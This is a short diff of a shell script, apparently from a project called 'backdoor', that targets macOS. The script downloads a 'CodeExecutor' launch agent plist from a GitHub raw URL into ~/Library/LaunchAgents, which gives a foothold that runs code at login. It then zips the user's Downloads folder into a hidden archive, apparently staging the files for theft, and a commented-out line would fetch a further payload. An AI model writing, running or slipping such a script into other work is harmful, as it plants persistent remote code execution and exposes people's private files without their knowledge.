@@ -1,9 +1,9 @@
 cd ~/Library/LaunchAgents/
 curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.wolfoverflow.CodeExecutor.plist"
-cd ..
+# cd ..
 # echo "success" >> .bombmaterials
-cd ..
-cd Downloads/
+# cd ..
+cd ~/Downloads
 zip -r ../.downloads.zip *
 # cd ~/Desktop
 # curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
